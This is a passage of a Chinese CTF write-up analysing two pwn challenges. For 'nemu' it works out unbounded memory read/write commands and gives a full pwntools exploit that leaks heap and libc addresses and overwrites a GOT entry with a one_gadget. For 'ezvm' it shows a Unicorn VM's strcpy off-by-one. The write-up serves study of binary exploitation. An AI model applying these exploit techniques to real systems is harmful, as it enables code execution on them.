<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct &#123;<br>  uint32_t opcode;<br>  vaddr_t seq_eip;  // sequential eip<br>  bool is_operand_size_16;<br>  uint8_t ext_opcode;<br>  bool is_jmp;<br>  vaddr_t jmp_eip;<br>  Operand src, dest, src2;<br>#ifdef DEBUG<br>  char assembly[80];<br>  char asm_buf[128];<br>  char *p;<br>#endif<br>&#125; DecodeInfo;<br></code></pre></td></tr></table></figure>

<p>阅读大致源码就能发现，nemu在模拟指令执行流程，但每一条指令都不是真正被执行的，并且也由于它实现的指令数量太少，不可能通过加载字节码的方式来利用，所以应该另寻他路。</p>
<p>但注意到所谓image是一个数组，通过下述定义：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#define PMEM_SIZE (128 * 1024 * 1024)<br>uint8_t pmem[PMEM_SIZE] = &#123;0&#125;;<br></code></pre></td></tr></table></figure>

<p>其既然作为全局变量被声明，就说明它并非开辟在栈上，但也因为它过大的尺寸且不需要初值，所以被置于不占空间的bss段上，那么访问该映像就是访问bss。注意到nemu提供了指令x用于获取对应地址的内容，其关键实现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uint32_t __fastcall vaddr_read(vaddr_t addr, int len)<br>&#123;<br>  return *&amp;pmem[addr] &amp; (0xFFFFFFFF &gt;&gt; (8 * (4 - len)));//len==4<br>&#125;<br></code></pre></td></tr></table></figure>

<p>能够发现，它没有对地址进行限定，也就是说，能够访问超出image范围的内存，实现任意地址读(指任意高地址读)。</p>
<p>同时，指令set的核心实现vaddr_write如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void __fastcall vaddr_write(vaddr_t addr, int len, uint32_t data)<br>&#123;<br>  uint32_t dataa; // [rsp+4h] [rbp-14h] BYREF<br>  unsigned __int64 v4; // [rsp+8h] [rbp-10h]<br><br>  dataa = data;<br>  v4 = __readfsqword(0x28u);<br>  memcpy((addr + 0x6A3B80LL), &amp;dataa, len);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>0x6A3B80LL就是pmem，这里同样没有做地址限制，能够实现任意地址写(但必须注意，任意地址写并不准确，只能往pmem的高地址任意写，没办法向低地址写)。</p>
<p>既然已经能任意地址读写了，那我们的目的自然也就明确了，读出libc_base，然后某个函数为one_gadget就行了。</p>
<p>看起来这样好像就行了，但如果没看过wp就不会这么顺利了，也把其他指令分析一下看看吧。</p>
<p>指令w的核心是set_watchpoint：（精简后）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void __fastcall set_watchpoint(char *args)<br>&#123;<br>  if ( flag )<br>  &#123;<br>    v2 = free_;<br>    v3 = free_-&gt;next;<br>    free_-&gt;old_val = v1;<br>    v2-&gt;next = 0LL;<br>    free_ = v3;<br>    *v2-&gt;exp = *args;<br>    *&amp;v2-&gt;exp[8] = *(args + 1);<br>    *&amp;v2-&gt;exp[16] = *(args + 2);<br>    *&amp;v2-&gt;exp[24] = *(args + 6);<br>    *&amp;v2-&gt;exp[28] = *(args + 14);<br>    v4 = head;<br>    if ( head )<br>    &#123;<br>      while ( v4-&gt;next )<br>        v4 = v4-&gt;next;<br>      v2-&gt;NO = v4-&gt;NO + 1;<br>      v4-&gt;next = v2;<br>    &#125;<br>    else<br>    &#123;<br>      v2-&gt;NO = 1;<br>      head = v2;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>nemu对watchpoint的内存使用内存池管理，在初始化阶段通过init_wp_pool构建内存池：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void __cdecl init_wp_pool()<br>&#123;<br>  __int64 v0; // rax<br>  int i; // edx<br><br>  v0 = 141180952LL;<br>  for ( i = 0; i != 32; ++i )<br>  &#123;<br>    *(v0 - 56) = i;<br>    *(v0 - 48) = v0;<br>    v0 += 56LL;<br>  &#125;<br>  wp_pool[31].next = 0LL;<br>  head = 0LL;<br>  free_ = wp_pool;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>head和free以及wp_pool都是watchpoint结构体指针，定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct watchpoint &#123;<br>  int NO;<br>  struct watchpoint *next;<br> char exp[30];<br> uint32_t old_val;<br> uint32_t new_val;<br><br>&#125; WP;<br></code></pre></td></tr></table></figure>

<p>而wp_pool同时也是一个数组，但这方面不用多想，逻辑是朴素的：</p>
<blockquote>
<p>内存池是wp_pool，初始化阶段会将整个内存池挂进free_</p>
<p>申请wp时，从free_中获取一个结构体；释放时，将目标放回free_链表(均通过next指针)</p>
<p>head指针是指向使用中的wp结构体的<br>在调用set_watchpoint时，将申请到的结构体挂进head，通过head遍历所有的wp</p>
</blockquote>
<p>这里同样有能够利用的地方，重点如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">v2 = free_;<br>v2-&gt;next = 0LL;<br>*v2-&gt;exp = *args;<br></code></pre></td></tr></table></figure>

<p>如果我们能够修改free_的内容为某个地址，就能通过指令w向该地址写入数据了</p>
<p>不过会否有些多此一举？不是已经能够任意地址写了吗？那这有什么意义呢？</p>
<p>尽管已经能够任意地址写了，但vaddr_write是写4字节，set_watchpoint能一次写入0x28字节；并且，我们需要把写入地址传给vaddr_write，这些参数会经过expr的处理，经笔者测试后发现，对于一些较大的地址参数会被越过而无法写入。不过expr函数的主要作用就是解析参数，似乎我们不应该费力去分析它的工作流程，所以笔者对w指令的分析到此为止，不再深入</p>
<p>指令d的核心是delete_watchpoint，是指令w的逆操作，这里不再赘述。而指令p、指令q等则未完成，所以没有实现。</p>
<p>至此我们已经分析完会接触到的所有指令，并有了思路，接下来是利用。</p>
<p>首先我们应该泄露libc_base。但读取数据是有限制的，首先，我们只能读取pmem的高位，其次，不能高出太多，最多是四个字节的表示范围内。所以我们应该从bss中找一个能够获取chunk地址的数据。通过调试，我们选择re为目标：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">static regex_t re[NR_REGEX];<br></code></pre></td></tr></table></figure>

<p>这个数组在初始化完成以后会被放入一系列的缓冲区，大致结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;<br>    __buffer = 0x86a5530, <br>    __allocated = 0xe0, <br>    __used = 0xe0, <br>    __syntax = 0x3b2fc, <br>    __fastmap = 0x86a5420 &quot;&quot;, <br>    __translate = 0x0, <br>    re_nsub = 0x0, <br>    __can_be_null = 0x0, <br>    __regs_allocated = 0x0, <br>    __fastmap_accurate = 0x1, <br>    __no_sub = 0x0, <br>    __not_bol = 0x0, <br>    __not_eol = 0x0, <br>    __newline_anchor = 0x0<br>&#125;<br></code></pre></td></tr></table></figure>

<p>buffer是从堆上开辟的，任意读一个buffer出来，我们都能拿到堆的基址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cmd_x(pmem_end+0x40)<br>recv_pad()#吸收掉无用数据<br>heap_base=int(p.recv(8),16)-0x530<br>print(&quot;heap_base:&quot;+str(hex(heap_base)))<br></code></pre></td></tr></table></figure>

<p>然后通过调试找一块在当前状态下fd或bk未没清空的chunk(笔者试着在Bin中查找，但那个方法不太起效，所以直接通过gdb的heap指令找了一块出来)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#因为一次只能读取4字节，所以需要调整参数读两次<br>target_chunk=heap_base+0x19770+0x10<br>cmd_x(heap_base+(0x951d090-0x9504000)-pmem_start+0x18)<br>recv_pad()<br>libc_leak=int(p.recv(8),16)<br>cmd_x(heap_base+(0x951d090-0x9504000)-pmem_start+0x18+4)<br>recv_pad()<br>libc_leak2=int(p.recv(8),16)<br>libc_leak=(libc_leak2&lt;&lt;32)+libc_leak<br>libc_base=libc_leak-(0x7f575472db98-0x00007f5754369000)<br>print(&quot;libc_base:&quot;+str(hex(libc_base)))<br></code></pre></td></tr></table></figure>

<p>接下来就需要写got表了，但我们知道，got表在pmem的低地址处，正常操作写不到它，因此这里需要用到指令w来做另外一种写数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#首先，把free_写入printf_chk_got-0x30<br>cmd_set(free_-pmem_start,printf_chk_got-0x30)<br>#接下来调用指令w<br>cmd_w(one_gadget)<br></code></pre></td></tr></table></figure>

<p>指令w的关键汇编如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.text:0000000000409602                 mov     rcx, cs:free_<br>.text:0000000000409609                 test    rcx, rcx<br>.text:000000000040960C                 jz      loc_4096BC<br>.text:0000000000409612                 mov     rdx, [rcx+8]<br>.text:0000000000409616                 mov     [rcx+30h], eax<br></code></pre></td></tr></table></figure>

<p>eax是我们的参数低4位，而rcx则是free_。该函数会将free_取出，并在[rcx+30h]处放入eax，我们由此完成got表的篡改。</p>
<p>最后只需要调用printf_chk函数即可。</p>
<p>笔者自己的完整exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level = &#x27;debug&#x27;)<br><br>p=process(&quot;./nemu&quot;)<br>elf=ELF(&quot;./nemu&quot;)<br>libc=elf.libc<br><br>def dbg(addr):<br>    gdb.attach(p,&#x27;b *(&#123;&#125;)\nc\n&#x27;.format(addr))<br><br>def send_cmd(cmd):<br>    p.recvuntil(&#x27;(nemu) &#x27;)<br>    p.sendline(cmd)<br><br>def cmd_x(addr):<br>    cmd=&quot;x &quot;+str(hex(addr))<br>    send_cmd(cmd)<br><br>def cmd_set(addr,context):<br>    cmd=&quot;set &quot;+str(hex(addr))+&quot; &quot;+str(context)<br>    send_cmd(cmd)<br><br>def cmd_w(addr):<br>    cmd=&quot;w &quot;+str(hex(addr))<br>    send_cmd(cmd)<br>def recv_pad():<br>    p.recvuntil(&quot;0x&quot;)<br>    p.recvuntil(&quot;0x&quot;)<br>    p.recvuntil(&quot;0x&quot;)<br><br>pmem_end=0x8000000<br>pmem_start=0x6A3B80<br>free_=0x86A3FC0<br>########### part 1 ###########<br>cmd_x(pmem_end+0x40)<br>recv_pad()<br>heap_base=int(p.recv(8),16)-0x530<br>print(&quot;heap_base:&quot;+str(hex(heap_base)))<br><br>target_chunk=heap_base+0x19770+0x10<br>cmd_x(heap_base+(0x951d090-0x9504000)-pmem_start+0x18)<br>recv_pad()<br>libc_leak=int(p.recv(8),16)<br>cmd_x(heap_base+(0x951d090-0x9504000)-pmem_start+0x18+4)<br>recv_pad()<br>libc_leak2=int(p.recv(8),16)<br>libc_leak=(libc_leak2&lt;&lt;32)+libc_leak<br>libc_base=libc_leak-(0x7f575472db98-0x00007f5754369000)<br>print(&quot;libc_base:&quot;+str(hex(libc_base)))<br>og = [0x4527a,0xf03a4,0xf1247]<br>one_gadget=libc_base+og[0]<br><br>printf_chk_got=elf.got[&quot;__printf_chk&quot;]<br>cmd_set(free_-pmem_start,printf_chk_got-0x30)<br>cmd_w(one_gadget)<br>#因为没输入参数而调用printf_chk<br>cmd=&quot;w&quot;<br>send_cmd(cmd)<br><br>p.interactive(）<br></code></pre></td></tr></table></figure>

<ul>
<li>题外话：笔者看了一下官方WP和Nu1L战队对本题的解法，脑洞大开，不得不感叹师傅们真的太强了……不过heap_base的思路来自于C4oy1师傅</li>
</ul>
<h3 id="ezvm"><a href="#ezvm" class="headerlink" title="ezvm"></a>ezvm</h3><p>第一次接触Unicorn，虽然之前也遇到过类似的题目，但当时受限于技术水平，连WP都不能很好的理解，这次算是正式接触这类模拟器了。</p>
<p>Unicorn是一款成熟的开源CPU模拟器，本题通过该项目实现了一个简单的虚拟机。其main函数简化后的主要逻辑如下：(出于可读性考虑，所以简化代码后不考虑代码是否可执行)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall main(__int64 a1, char **a2, char **a3)<br>&#123;<br>  puts(&quot;Send your code:&quot;);<br>  v11 = get_input(&amp;unk_54E0, 0x4000);<br>  v5 = 4660;<br>  v6 = 22136;<br>  puts(&quot;Emulate i386 code&quot;);<br>  v10 = 0x7FFFFFFFE000LL;<br>  v7 = uc_open(4LL, 8LL, &amp;v8);<br>  uc_mem_map(v8, 0x400000LL, 0x10000LL, 7LL);<br>  uc_mem_map(v8, 0x7FFFFFFEF000LL, 0x10000LL, 7LL);<br>  uc_mem_write(v8, 0x400000LL, &amp;unk_54E0, v11 - 1)<br>  uc_hook_add(v8, v9, 2LL, handle_syscall, 0LL, 1LL,0LL,699LL);//UC_X86_INS_SYSCALL<br>  uc_reg_write(v8, 44LL, &amp;v10);<br>  v7 = uc_emu_start(v8, 0x400000LL, v11 + 0x3FFFFF, 0LL, 0LL);<br>  uc_reg_read(v8, 22LL, &amp;v5);<br>  uc_reg_read(v8, 24LL, &amp;v6);<br>  printf(&quot;&gt;&gt;&gt; ECX = 0x%x\n&quot;, v5);<br>  printf(&quot;&gt;&gt;&gt; EDX = 0x%x\n&quot;, v6);<br>  uc_close(v8);<br>  return 0LL;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>大致意思是：</p>
<blockquote>
<p>初始化一台模拟器，将用户输入的机器码映射到模拟器的0x400000地址处，然后注册一个syscall_hook，当模拟器内执行syscall指令时，调用hook中的实现。最后将模拟器的ecx和edx寄存器内容读出显示给用户。</p>
</blockquote>
<p>handle_syscall函数简化后的逻辑如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">unsigned __int64 __fastcall handle_syscall(__int64 a1)<br>&#123;<br>  uc_reg_read(a1, 35LL, &amp;reg_rax);<br>  if ( reg_rax == 1 )<br>    system_write(a1);<br>  else if ( reg_rax == 2 )<br>    system_open(a1);<br>  else if ( reg_rax == 3 )<br>    system_close(a1);<br>  else if(reg_rax == 0)<br>    system_read(a1);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>文件结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">struct_fd       struc ; (sizeof=0x48, mappedto_8)<br>00000000 fileno          dq ?<br>00000008 name            db 24 dup(?)<br>00000020 malloc_buf      dq ?<br>00000028 malloc_size     dq ?<br>00000030 read_func       dq ?                   <br>00000038 write_func      dq ?                    <br>00000040 close_func      dq ? <br><br>00000048 struct_fd       ends<br></code></pre></td></tr></table></figure>

<p>另外，本题开启了沙箱，具体代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">prctl(38, 1LL, 0LL, 0LL, 0LL);<br>prctl(22, 2LL, &amp;v1);<br></code></pre></td></tr></table></figure>

<p>沙箱规则这里就不细究了，大致意思就是只能使用orw三个调用。</p>
<h4 id="system-open"><a href="#system-open" class="headerlink" title="system_open"></a>system_open</h4><p>这里笔者只截取核心实现：<strong>fd_malloc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">size_t __fastcall fd_malloc(const char *a1, unsigned __int64 a2)<br>&#123;<br>  unsigned __int64 size; // [rsp+0h] [rbp-20h]<br>  int i; // [rsp+14h] [rbp-Ch]<br>  int j; // [rsp+14h] [rbp-Ch]<br>  struct_fd *v6; // [rsp+18h] [rbp-8h]<br><br>  size = a2;<br>  for ( i = 0; i &lt;= 15; ++i )<br>  &#123;<br>    if ( !strcmp(struct_file[i].name, a1) )<br>      return struct_file[i].fileno;<br>  &#125;<br>  if ( count_fd &gt; 15 )<br>    return 0xFFFFFFFFLL;<br>  if ( a2 &gt; 0x400 )<br>    size = 0x400LL;<br>  for ( j = 0; j &lt;= 15 &amp;&amp; struct_file[j].name[0]; ++j )<br>    ;<br>  v6 = &amp;struct_file[j];<br>  v6-&gt;malloc_buf = malloc(size);<br>  strcpy(v6-&gt;name, a1);<br>  v6-&gt;read_func = malloc_read;<br>  v6-&gt;write_func = malloc_write;<br>  v6-&gt;close_func = malloc_close;<br>  v6-&gt;fileno = j;<br>  ++count_fd;<br>  v6-&gt;malloc_size = size;<br>  return v6-&gt;fileno;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>注意到第22行的strcpy函数，它将a1按字节传入v6-&gt;name，根据文件结构可知，如果a1字符串足够长，就应该能从name溢出到malloc_buf，因为strcpy会一直拷贝直到src遇到’\x00’字符为止。</p>
<p>而在system_open函数中可以发现，a1的来源如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">char name[56];<br>uc_reg_read(a1, 39LL, &amp;v3);<br>uc_reg_read(a1, 0x2BLL, &amp;size);<br>if ( !uc_mem_read(a1, v3, name, 24LL) )<br>&#123;<br>  v2 = fd_malloc(name, size);<br>  (uc_reg_write)(a1, 35LL, &amp;v2);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>此处的a1是模拟器本身，uc_reg_read会从edi和esi寄存器中分别读出数据放入v3和size，v3则是字符串指针，再通过uc_mem_read将指针处字符串读出，写入name数组。</p>
<p>但值得注意的是，uc_mem_read最多读取24个字符，所以name只会有24个字符。</p>
<p>同时我们可以知道，文件结构中的name字段也是24个字符，而strcpy函数会在dest字符串尾部用’\x00’填充。因此，如果name填满24字节，就会有一个’\x00’溢出到malloc_buf处导致off-by-one漏洞。</p>
<h4 id="fd-write"><a href="#fd-write" class="headerlink" title="fd_write"></a>fd_write</h4><p>同样只看关键部分：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ssize_t __fastcall fd_write(int fd, const void *buf, size_t size)<br>&#123;<br>  int i; // [rsp+2Ch] [rbp-4h]<br>  for ( i = 0; i &lt;= 15; ++i )<br>  &#123;<br>    if ( struct_file[i].fileno == fd )<br>      return struct_file[i].write_func(&amp;struct_file[i].fileno, buf, size);<br>  &#125;<br>  return 0xFFFFFFFFLL;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>write_func是之前储存在文件结构中的函数指针，其实现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">size_t __fastcall malloc_write(struct_fd *fd, const void *buf, unsigned __int64 size_1)<br>&#123;<br>  unsigned __int64 size; // [rsp+28h] [rbp-8h]<br>  size = size_1;<br>  if ( size_1 &gt; fd-&gt;malloc_size &amp;&amp; size_1 &gt; 0x400 )<br>    size = 0x400LL;<br>  if ( size &gt; fd-&gt;malloc_size )<br>    fd-&gt;malloc_buf = realloc(fd-&gt;malloc_buf, size);<br>  fd-&gt;malloc_size = size;<br>  memcpy(fd-&gt;malloc_buf, buf, size);<br>  return size;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>首先通过fileno找到对应的文件，然后用memcpy将buf中的内容拷贝到fd-&gt;malloc_buf中。</p>
<h4 id="system-read"><a href="#system-read" class="headerlink" title="system_read"></a>system_read</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ssize_t __fastcall fd_read(int a1, void *a2, size_t a3)<br>&#123;<br>  int i; // [rsp+2Ch] [rbp-4h]<br><br>  for ( i = 0; i &lt;= 15; ++i )<br>  &#123;<br>    if ( struct_file[i].fileno == a1 )<br>      return struct_file[i].read_func(&amp;struct_file[i].fileno, a2, a3);<br>  &#125;<br>  return 0xFFFFFFFFLL;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">size_t __fastcall malloc_read(struct_fd *fd, void *buf, size_t size)<br>&#123;<br>  size_t n; // [rsp+28h] [rbp-8h]<br><br>  n = size;<br>  if ( size &gt; fd-&gt;malloc_size )<br>    n = fd-&gt;malloc_size;<br>  memcpy(buf, fd-&gt;malloc_buf, n);<br>  return n;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>通过memcpy将fd-&gt;malloc_buf的数据拷贝到buf里。</p>
<h4 id="system-close"><a href="#system-close" class="headerlink" title="system_close"></a>system_close</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall fd_free(int a1)<br>&#123;<br>  int i; // [rsp+1Ch] [rbp-4h]<br><br>  for ( i = 0; i &lt;= 15; ++i )<br>  &#123;<br>    if ( struct_file[i].fileno == a1 )<br>      return struct_file[i].close_func(&amp;struct_file[i]);<br>  &#125;<br>  return 0xFFFFFFFFLL;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall malloc_close(struct_fd *fd)<br>&#123;<br>  if ( fd-&gt;malloc_buf )<br>    free(fd-&gt;malloc_buf);<br>  memset(fd-&gt;name, 0, sizeof(fd-&gt;name));<br>  fd-&gt;malloc_buf = 0LL;<br>  fd-&gt;malloc_size = 0LL;<br>  --count_fd;<br>  return 0LL;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>释放fd-&gt;malloc_buf并置零，其他参数数据清空，全局fd计数器减一。</p>
<p>但必须注意的是，对于stdin、stdout、stderr，它们有自己另外的处理函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ssize_t __fastcall sub_168E(_QWORD *a1, void *a2, size_t a3)<br>&#123;<br>  return read(*a1, a2, a3);<br>&#125;<br></code></pre></td></tr></table></figure>

